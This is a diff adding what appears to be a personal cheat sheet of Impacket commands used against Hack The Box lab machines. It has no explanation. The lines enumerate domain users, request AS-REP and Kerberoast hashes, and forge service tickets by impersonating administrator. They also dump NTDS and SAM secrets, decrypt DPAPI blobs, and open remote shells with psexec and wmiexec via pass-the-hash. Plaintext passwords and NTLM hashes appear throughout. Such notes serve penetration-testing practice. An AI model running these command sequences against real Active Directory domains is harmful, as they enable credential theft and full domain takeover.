@@ -1,0 +1,62 @@
+
+
+
+
+
+
+
+impacket-lookupsid anonymous@manager.htb -no-pass
+impacket-lookupsid anonymous@manager.htb -no-pass | grep 'SidTypeUser' | awk -F '\\' '{print $2}' | awk '{print $1}' > users
+impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'
+impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb' | grep 'SidTypeUser' | awk -F '\\' '{print $2}' | awk '{print $1}' > users
+
+
+
+
+impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
+impacket-mssqlclient mssql-svc:corporate568@10.10.10.125 -windows-auth
+impacket-mssqlclient sequel.htb/'sa:MSSQLP@ssw0rd!'@10.10.11.51
+impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
+
+
+impacket-smbclient cascade.local/r.thompson:rY4n5eva@10.10.10.182
+
+
+
+impacket-getST support.htb/FAKE-COMP01$:'Password123' -impersonate administrator -spn cifs/dc.support.htb -dc-ip 10.10.11.174
+impacket-getST support.htb/FAKE-COMP01$:'Password123' -impersonate administrator -spn host/dc.support.htb -dc-ip 10.10.11.174
+impacket-getST intelligence.htb/svc_int$ -hashes :1dcabcce2cf522bae77d7dc622587879 -impersonate Administrator -spn WWW/dc.intelligence.htb -dc-ip 10.10.10.248
+
+
+
+impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 -no-pass
+impacket-GetNPUsers active.htb/svc_tgs -dc-ip 10.10.10.100 -request
+
+
+
+impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request
+
+
+impacket-GetADUsers active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -all
+impacket-GetADUsers spookysec.local/ -dc-ip 10.201.0.197 -no-pass
+
+
+
+
+impacket-dpapi credential -file cred_blob -key 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
+impacket-dpapi masterkey -file masterkey -sid S-1-5-21-953262931-566350628-63446256-1001 -password '4Cc3ssC0ntr0ller'
+
+impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42 -just-dc
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+impacket-secretsdump -system SYSTEM.bak -sam SAM.bak LOCAL
+
+
+
+impacket-wmiexec -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.10.10.192
+impacket-psexec 'administrator:4dD!5}x/re8]FBuZ@10.10.10.149'
+impacket-psexec active.htb/administrator:Ticketmaster1968@10.10.10.100 -codec cp737
+impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+impacket-psexec cicada.htb/Administrator@cicada.htb -hashes aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341
+impacket-wmiexec cicada.htb/Administrator@cicada.htb -hashes aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341
+impacket-psexec secnotes/administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
+impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
